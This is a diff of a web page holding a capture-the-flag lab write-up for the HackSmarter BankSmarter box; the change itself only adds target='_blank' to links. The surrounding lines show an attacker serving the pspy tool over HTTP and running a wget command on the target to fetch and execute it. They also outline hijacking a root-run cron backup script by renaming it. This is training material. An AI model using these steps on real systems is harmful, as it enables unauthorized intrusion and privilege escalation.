@@ -28,7 +28,7 @@
 <main class="main-content">
 
 
-    <p>This CTF challenge is from <a href="https://www.hacksmarter.org">HackSmarter platform</a></p>
+    <p>This CTF challenge is from <a href="https://www.hacksmarter.org" target="_blank">HackSmarter platform</a></p>
 <h1 id="mission-scenario">Mission Scenario</h1>
 <p>You are a senior operator on the Hack Smarter Red Team, tasked with a penetration test against a standalone Linux server. Your objective is to gain initial access and escalate privileges to root, emulating a worst-case scenario where a threat actor successfully compromises a critical asset.</p>
 <p>You have been given the IP address of the target server and your mission is to gain a foothold, escalate to the <strong>root</strong> user, and retrieve the final flag from the <code>/root/</code> directory.</p>
@@ -136,7 +136,7 @@ uid=1001(layne.stanley) gid=1001(layne.stanley) groups=1001(layne.stanley)
 <h3 id="pspy">Pspy</h3>
 <p>We have to download it to the machine. </p>
 <ol>
-<li>Download it to your Linux machine. <a href="https://github.com/DominicBreuker/pspy">Here</a></li>
+<li>Download it to your Linux machine. <a href="https://github.com/DominicBreuker/pspy" target="_blank">Here</a></li>
 <li>Run a server on your Linux machine: <code>python3 -m http.server</code></li>
 <li>On the target machine run this command: <code>wget http://[your IP tun0]/[name of the pspy file]</code></li>
 <li>Add the permissions to run a file <code>chmod +x pspy64</code></li>
@@ -147,7 +147,7 @@ uid=1001(layne.stanley) gid=1001(layne.stanley) groups=1001(layne.stanley)
 <code>./pspy64</code></p>
 <p>There is a cronjob running the backup script
 <div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Cronjob running.png"></div></p>
-More info about <a href="https://github.com/DominicBreuker/pspy">Pspy</a> If you like to know more about this tool.</p>
+More info about <a href="https://github.com/DominicBreuker/pspy" target="_blank">Pspy</a> If you like to know more about this tool.</p>
 <p>UID=1002 have user with name: <code>scott.weiland</code> 
 <div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/scott.weiland UID.png"></div></p>
 <p>We are not able to write into file but we are able to rename it &quot;bankSmarter_backup.sh&quot; which the scott is running over stanley user and when we rename it then we can write our own code.</p>
@@ -276,7 +276,7 @@ root@ip<span class="hljs-string">-10</span><span class="hljs-string">-0</span><s
 <div class="screenshot"><img src="/content/Writeups/HackSmarter/img/BankSmarter/Root Flag.png"></div></p>
 <p>When you obtain this root flag try to decode this b64 encryption ;)</p>
 <h1 id="note-">Note:</h1>
-<p>Big shout-out to Tyler Ramsbey who built HackSmarter and also huge thanks to author of this room:  <a href="https://www.linkedin.com/in/ryan-yager-442a4964/">Ryan Yager</a>.</p>
+<p>Big shout-out to Tyler Ramsbey who built HackSmarter and also huge thanks to author of this room:  <a href="https://www.linkedin.com/in/ryan-yager-442a4964/" target="_blank">Ryan Yager</a>.</p>
 <p>PS: If you get stuck, try to find a solution by yourself. It will improve your skills rapidly. Even if it takes a lot of time, the struggle is worth it.</p>
 
 
